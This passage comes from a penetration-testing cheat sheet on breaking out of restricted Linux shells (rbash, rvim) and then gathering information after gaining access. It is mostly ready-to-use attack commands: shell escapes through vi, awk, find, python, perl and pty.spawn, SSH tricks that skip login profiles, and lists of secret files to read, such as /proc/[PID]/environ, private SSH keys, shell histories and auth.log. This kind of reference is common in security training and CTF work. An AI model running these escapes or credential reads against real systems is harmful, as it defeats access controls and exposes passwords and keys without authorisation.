- Specifying the '-p' option to the 'command' built-in.
- Turning off restricted mode with 'set +r' or 'set +o restricted

Real shell implements restricted shells:

- rbash

  ```none
  bash -r
  cd
  bash: cd: restricted
  ```

- rsh
- rksh

**Getting out of restricted shell**

### Reconnaissance

Find out information about the environment.

- Run env to see exported environment variables

- Run 'export -p' to see the exported variables in the shell. This would tell which variables are read-only. Most likely the PATH ($PATH) and SHELL ($SHELL) variables are '-rx', which means we can execute them, but not write to them. If they are writeable, we would be able to escape the restricted shell!

  - If the SHELL variable is writeable, you can simply set it to your shell of choice (i.e. sh, bash, ksh, etc...).
  - If the PATH is writeable, then you'll be able to set it to any directory you want. We recommend setting it to one that has commands vulnerable to shell escapes.

- Try basic Unix commands and see what's allowed ls, pwd, cd, env, set, export, vi, cp, mv etc.

### Quick Wins

- If '/' is allowed in commands just run /bin/sh
- If we can set PATH or SHELL variable

  ```none
  export PATH=/bin:/usr/bin:/sbin:$PATH
  export SHELL=/bin/sh
  ```

  or if chsh command is present just change the shell to /bin/bash

  ```none
  chsh
  password: <password will be asked>
  /bin/bash
  ```

- If we can copy files into existing PATH, copy

  ```none
  cp /bin/sh /current/directory; sh
  ```

### Taking help of binaries

Some commands let us execute other system commands, often bypassing shell restrictions

- ftp -> !/bin/sh
- gdb -> !/bin/sh
- more/ less/ man -> !/bin/sh
- vi -> :!/bin/sh : Refer [Breaking out of Jail : Restricted Shell](http://airnesstheman.blogspot.in/2011/05/breaking-out-of-jail-restricted-shell.html) and [Restricted Accounts and Vim Tricks in Linux and Unix](http://linuxshellaccount.blogspot.in/2008/05/restricted-accounts-and-vim-tricks-in.html)
- scp -S /tmp/getMeOut.sh x y : Refer [Breaking out of rbash using scp](http://pentestmonkey.net/blog/rbash-scp)
- awk 'BEGIN {system("/bin/sh")}'
- find / -name someName -exec /bin/sh \;
- tee

  ```none
  echo "Your evil code" | tee script.sh
  ```

- Invoke shell thru scripting language

  - Python

    ```none
    python -c 'import os; os.system("/bin/bash")
    ```

  - Perl

    ```none
    perl -e 'exec "/bin/sh";'
    ```

### SSHing from outside

- Use SSH on your machine to execute commands before the remote shell is loaded:

  ```none
  ssh username@IP -t "/bin/sh"
  ```

- Start the remote shell without loading "rc" profile (where most of the limitations are often configured)

  ```none
  ssh username@IP -t "bash --noprofile"

  -t      Force pseudo-terminal allocation.  This can be used to execute arbitrary screen-based programs on a remote machine, which can be very useful, e.g. when implementing menu services.  Multiple -t options force tty allocation, even if ssh has no local tty
  ```

### Getting out of rvim

Main difference of rvim vs vim is that rvim does not allow escape to shell with previously described techniques and, on top of that, no shell commands at all. Taken from [vimjail](https://ctftime.org/writeup/5784)

- To list all installed features it is possible to use ':version' vim command.

  ```none
  :version
  VIM - Vi IMproved 8.0 (2016 Sep 12, compiled Nov 04 2017 04:17:46)
  Included patches: 1-1257
  Modified by pkg-vim-maintainers@lists.alioth.debian.org
  Compiled by pkg-vim-maintainers@lists.alioth.debian.org
  Huge version with GTK2 GUI.  Features included (+) or not (-):
  +acl             +cindent         +cryptv          -ebcdic          +float           +job             +listcmds        +mouse_dec       +multi_byte      +persistent_undo  +rightleft       +syntax          +termresponse    +visual          +X11  
  +arabic          +clientserver    +cscope          +emacs_tags      +folding         +jumplist        +localmap        +mouse_gpm       +multi_lang      +postscript       +ruby            +tag_binary      +textobjects     +visualextra     -xfontset 
  +autocmd         +clipboard       +cursorbind      +eval            -footer          +keymap          +lua             -mouse_jsbterm   -mzscheme        +printer          +scrollbind      +tag_old_static  +timers          +viminfo         +xim
  +balloon_eval    +cmdline_compl   +cursorshape     +ex_extra        +fork()          +lambda          +menu            +mouse_netterm   +netbeans_intg   +profile          +signs           -tag_any_white   +title           +vreplace        +xpm
  +browse          +cmdline_hist    +dialog_con_gui  +extra_search    +gettext         +langmap         +mksession       +mouse_sgr       +num64           -python           +smartindent     +tcl             +toolbar         +wildignore      +xsmp_interact
  ++builtin_terms  +cmdline_info    +diff            +farsi           -hangul_input    +libcall         +modify_fname    -mouse_sysmouse  +packages        +python3          +startuptime     +termguicolors   +user_commands   +wildmenu        +xterm_clipboard
  +byte_offset     +comments        +digraphs        +file_in_path    +iconv           +linebreak       +mouse           +mouse_urxvt     +path_extra      +quickfix         +statusline      +terminal        +vertsplit       +windows         -xterm_save
  +channel         +conceal         +dnd             +find_in_path    +insert_expand   +lispindent      +mouseshape      +mouse_xterm     +perl            +reltime         - sun_workshop    +terminfo        +virtualedit     +writebackup
    system vimrc file: "$VIM/vimrc"
  ```

- Examining installed features and figure out which interpreter is installed.

- If python/ python3 has been installed

  ```none
  :python3 import pty;pty.spawn("/bin/bash")
  ```

## Gather information from files

In case of LFI or unprivileged shell, gathering information could be very useful. Mostly taken from [g0tmi1k Linux Privilege Escalation Blog](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

### Operating System

```none
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release      # Debian based
cat /etc/redhat-release   # Redhat based
```

### /Proc Variables

```none
/proc/sched_debug   This is usually enabled on newer systems, such as RHEL 6.  It provides information as to what process is running on which cpu.  This can be handy to get a list of processes and their PID number.
/proc/mounts        Provides a list of mounted file systems.  Can be used to determine where other interesting files might be located
/proc/net/arp       Shows the ARP table.  This is one way to find out IP addresses for other internal servers.
/proc/net/route     Shows the routing table information.
/proc/net/tcp 
/proc/net/udp       Provides a list of active connections.  Can be used to determine what ports are listening on the server
/proc/net/fib_trie  This is used for route caching.  This can also be used to determine local IPs, as well as gain a better understanding of the target's networking structure
/proc/version       Shows the kernel version.  This can be used to help determine the OS running and the last time it's been fully updated.
```

Each process also has its own set of attributes.  If we have the PID number and access to that process, then we can obtain some useful information about it, such as its environmental variables and any command line options that were run.  Sometimes these include passwords.  Linux also has a special proc directory called self which can be used to query information about the current process without having to know it's PID.

```none
/proc/[PID]/cmdline Lists everything that was used to invoke the process. This sometimes contains useful paths to configuration files as well as usernames and passwords.
/proc/[PID]/environ Lists all the environment variables that were set when the process was invoked.  This also sometimes contains useful paths to configuration files as well as usernames and passwords.
/proc/[PID]/cwd Points to the current working directory of the process.  This may be useful if you don't know the absolute path to a configuration file.
/proc/[PID]/fd/[#] Provides access to the file descriptors being used.  In some cases this can be used to read files that are opened by a process.
```

The information about Proc variables has been taken from [Directory Traversal, File Inclusion, and The Proc File System](https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/)

## Environment Variables

```none
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
```

## Configuration Files

- Apache Web Server : Helps in figuring out the DocumentRoot where does your webserver files are?

  ```none
  /etc/apache2/apache2.conf
  /etc/apache2/sites-enabled/000-default 
  ```

## User History

```none
~/.bash_history
~/.nano_history
~/.atftp_history
~/.mysql_history
~/.php_history
~/.viminfo
```

## Private SSH Keys / SSH Configuration

```none
~/.ssh/authorized_keys : specifies the SSH keys that can be used for logging into the user account 
~/.ssh/identity.pub
~/.ssh/identity
~/.ssh/id_rsa.pub
~/.ssh/id_rsa
~/.ssh/id_dsa.pub
~/.ssh/id_dsa
/etc/ssh/ssh_config  : OpenSSH SSH client configuration files
/etc/ssh/sshd_config : OpenSSH SSH daemon configuration file
```

### Logs Files

Anything helpful in the logs file? Imagine, user running a command and that being logged in auth.log?

```none
cat /var/log/auth.log
```

Usually, any log files present in /var/log directory might be important.

```none
auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp
```
